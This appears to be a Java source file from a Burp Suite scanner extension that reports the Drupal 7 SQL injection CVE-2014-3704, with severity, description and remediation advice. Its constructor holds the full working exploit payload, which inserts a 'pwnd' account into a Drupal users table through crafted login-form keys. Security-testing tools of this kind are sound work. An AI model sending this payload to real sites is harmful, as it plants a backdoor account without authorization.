package burp;

import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class DRUPAL implements IScanIssue{

	IHttpRequestResponse r;
	IHttpRequestResponse[] rr = new IHttpRequestResponse[1];
	URL url;
	String req, res;
	IBurpExtenderCallbacks callback;
    IExtensionHelpers halp;
    int[] reqmarks = new int[2], resmarks = new int[2];
    List<int[]> reqmarkList = new ArrayList<>(1), resmarkList = new ArrayList<>(1);
    IHttpRequestResponse[] rra = new IHttpRequestResponse[1];
	
	public DRUPAL(IHttpRequestResponse r, URL url, IBurpExtenderCallbacks callback, IExtensionHelpers halp)
	{
		this.r = r;
		rr[0] = r; 
		this.url = url;
		this.callback = callback;
		this.halp = halp;
		
		//lets create markers
		req = halp.bytesToString(r.getRequest());
		res = halp.bytesToString(r.getResponse());
		
		reqmarks[0] = req.indexOf("name[0;insert%20into%20users%20values%20(99999,'pwnd','%24S%24DIkdNZqdxqh7Tmufxs8l1vAu0wdzxF%2F%2FsmWKAcjCv45KWjK0YFBg','pwnd@pwnd.pwn','','',NULL,0,0,0,1,NULL,'',0,'',NULL);#%20%20]=test&name[0]=test&pass=test&form_id=user_login_block&op=Log+in");
		reqmarks[1] = reqmarks[0] + new String("name[0;insert%20into%20users%20values%20(99999,'pwnd','%24S%24DIkdNZqdxqh7Tmufxs8l1vAu0wdzxF%2F%2FsmWKAcjCv45KWjK0YFBg','pwnd@pwnd.pwn','','',NULL,0,0,0,1,NULL,'',0,'',NULL);#%20%20]=test&name[0]=test&pass=test&form_id=user_login_block&op=Log+in").length();
		reqmarkList.add(reqmarks);
				
		resmarks[0] = res.indexOf("id=\"edit-name\" name=\"name\" value=\"test test\"");
		resmarks[1] = resmarks[0] + new String("id=\"edit-name\" name=\"name\" value=\"test test\"").length();
        resmarkList.add(resmarks);
        
        IHttpRequestResponseWithMarkers reqresMark = callback.applyMarkers(r, reqmarkList, resmarkList);
        rra[0] = reqresMark;

	}
	
	@Override
	public URL getUrl() {
		return url;
	}

	@Override
	public String getIssueName() {
		return "Drupal - SQL Injection (CVE-2014-3704)";
	}

	@Override
	public int getIssueType() {
		return 0;
	}

	@Override
	public String getSeverity() {
		return "High";
	}

	@Override
	public String getConfidence() {
		return "Firm";
	}

	@Override
	public String getIssueBackground() {
		return null;
	}

	@Override
	public String getRemediationBackground() {
		return null;
	}

	@Override
	public String getIssueDetail() {
		return "The expandArguments function in the database abstraction API in Drupal core 7.x before 7.32 does not properly construct prepared statements, which allows remote attackers to conduct SQL injection attacks via an array containing crafted keys."
				+ " An account with the username \"pwnd\" and password \"pwnd\" has been inserted into the database.";
	}

	@Override
	public String getRemediationDetail() {
		return "Update Drupal to version 7.32 or later.";
		}

	@Override
	public IHttpRequestResponse[] getHttpMessages() {
		return rra;
	}

	@Override
	public IHttpService getHttpService() {
		return r.getHttpService();
		}

}
